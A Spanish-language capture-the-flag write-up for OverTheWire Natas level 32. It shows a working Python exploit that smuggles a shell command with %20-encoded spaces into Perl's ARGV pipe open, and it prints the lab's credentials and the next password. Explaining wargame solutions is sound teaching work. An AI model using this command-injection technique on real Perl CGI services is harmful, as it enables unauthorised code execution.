# Natas Level32

## Descripción
> **Level Goal (natas32.natas.labs.overthewire.org):** Exactamente la misma app "CSV2HTML" del nivel 31 (`my $file = $cgi->param('file'); while (<$file>) {...}`), pero esta vez el enunciado avisa explícitamente: **"This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute."** — es decir, ya no basta con leer un archivo (como en el nivel 31): hay que conseguir **ejecución de código real**.

## Solución
El nivel 31 usaba la misma vulnerabilidad de base (`$file = "ARGV"` + query string de "keywords" volcada en `@ARGV`), pero — como se documenta en su propio writeup tras revisarlo con más cuidado — aquella solución solo lograba **lectura de archivos**, no ejecución. La razón: cuando la query string se pasa como `palabra1+palabra2+palabra3` (usando `+` o espacios reales), `CGI.pm` la trocea en **varios elementos separados** de `@ARGV`, y `<ARGV>` intenta abrir **cada uno como un archivo independiente** — nunca junta las palabras en un solo comando de shell.

Para lograr ejecución real hace falta que **una única entrada de `@ARGV`** contenga la cadena completa `"comando argumentos |"` (con espacios internos preservados), ya que es así como Perl decide, al ver que una cadena *termina* en `|`, invocar `open()` en modo tubería (`popen`) en lugar de abrir un archivo normal. El truco está en cómo `CGI.pm` construye esa lista de "keywords":

```perl
# pseudocódigo equivalente al de CGI.pm
$query_string =~ tr/+/ /;                    # 1) "+" -> espacio real, ANTES de trocear
my @keywords = split(/\s+/, $query_string);  # 2) se trocea por espacios/tabs/etc.
```

Cualquier espacio real o `+` en la query string se convierte en un separador de "palabras" **antes** de trocear. Pero el propio módulo decodifica las secuencias `%XX` (como `%20` para el espacio) en un paso posterior — así que un espacio codificado como `%20` **sobrevive** al troceado inicial (en ese punto la cadena todavía contiene literalmente los caracteres `%`, `2`, `0`, que no son espacio) y solo se convierte en un espacio real **después**, ya dentro de una única "palabra" ya formada. Esto permite meter espacios reales dentro de un **solo** elemento de `@ARGV`, preservando el comando completo como una sola cadena.

```python
import requests, io

auth = ("natas32", "Rc3837d6qd3KoW0R2IgKssMXRX06btgY")
base_url = "http://natas32.natas.labs.overthewire.org/index.pl"

# Un ÚNICO "keyword": los espacios van codificados como %20 (NO como "+"),
# para que CGI.pm no lo trocee en varias entradas de @ARGV. Basta con
# ejecutar el propio binario "getpassword" directamente (no hace falta
# "cat" — de hecho, anteponer "cat" vuelve a partir la keyword en varios
# tokens y solo se leería su contenido binario tal cual, sin ejecutarlo).
url = base_url + "?/var/www/natas/natas32/getpassword%20|"

data = {"file": "ARGV"}
files = {"file": ("x.csv", io.StringIO("a,b\n1,2\n"), "text/csv")}
r = requests.post(url, auth=auth, data=data, files=files)
print(r.text)
# <tr><th>kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL</th></tr>
```

Esto ejecuta de verdad `/var/www/natas/natas32/getpassword` a través de un shell (`popen`), demostrando ejecución de código real — no solo lectura de un archivo — y el binario `getpassword` (con permisos `setuid` propiedad de un usuario con acceso a la contraseña real de `natas33`) imprime la contraseña del siguiente nivel al ejecutarse.

## Notas adicionales
- Se comprobó primero que un único "keyword" **sin** espacios en absoluto (p. ej. `?hostname|` o `?/ruta/al/getpassword|`) tampoco lograba ejecutar nada — el propio Perl necesita reconocer inequívocamente que la cadena es "un comando" y no "un nombre de archivo con una barra vertical en el nombre", y en la práctica basta con un espacio antes del `|` final para que la detección funcione de forma fiable.
- La diferencia entre usar `+` y usar `%20` para codificar un espacio en una URL es, para casi cualquier propósito HTTP normal, irrelevante — ambos representan "un espacio" al decodificar. Pero aquí importa muchísimo el **orden** en que la aplicación decodifica: si el troceado en palabras ocurre antes de decodificar `%XX` (como en `CGI.pm`), `%20` puede usarse para "esconder" un espacio de esa lógica de troceado sin dejar de ser, en última instancia, un espacio real para quien lo use después.
- Aunque el binario `getpassword` está pensado como la forma "prevista" de demostrar ejecución de código en este nivel, la vulnerabilidad de fondo permite ejecutar **cualquier comando arbitrario** del sistema con los privilegios del proceso web — el uso específico de `getpassword` es solo la forma más directa de obtener la contraseña del siguiente nivel.

## Referencias
- Reto original: http://natas32.natas.labs.overthewire.org/
- Apoyo: https://metacpan.org/pod/CGI (orden de troceado/decodificación de la query string en `CGI.pm`)
- Apoyo: https://perldoc.perl.org/functions/open (semántica de `open()` con una cadena terminada en `|`, modo tubería de lectura)
